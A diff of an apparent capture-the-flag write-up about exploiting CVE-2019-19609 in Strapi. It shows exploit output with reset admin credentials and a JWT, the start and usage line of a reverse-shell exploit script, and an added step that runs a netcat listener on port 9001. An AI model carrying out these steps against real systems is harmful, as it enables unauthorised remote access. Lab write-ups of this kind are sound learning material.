@@ -201,7 +201,7 @@ After downloading it, I make the file executable and I run the script with the c
 [+] Your new credentials are: admin:SuperStrongPassword1
 [+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNzM2MzQwLCJleHAiOjE2MzMzMjgzNDB9.UiR8OMmTl31-u8kBO-MXWtzZulZA8bczLNEW9Q69TGs
 ```
-So now I can login to the site, I have a JSON Token, and I have a web shell. Normally I would see what I could enumerate from the site but I found another some <a href="https://github.com/dasithsv/CVE-2019-19609"> Github code </a> that utilizes my jwt to gain a reverse shell. The codes as: 
+So now I can login to the site, I have a JSON Token, and I have a web shell. Normally I would see what I could enumerate from the site but I found another some <a href="https://github.com/dasithsv/CVE-2019-19609"> Github code </a> that utilizes my jwt to gain a reverse shell. The codes reads as: 
 ```markdown
 #!/bin/python
 
@@ -237,4 +237,5 @@ if len(sys.argv) ==5:
 else:
     print('python3 exploit.py <rhost> <lhost> <jwt> <url>')
  ```
+ According to the code and documentation, I have to set up a listener on port 9001 before I run this so I open another terminal window and run `nc -nvlp 9001`. I copy the code into a `.py` file, make it executable, and run it with `
  
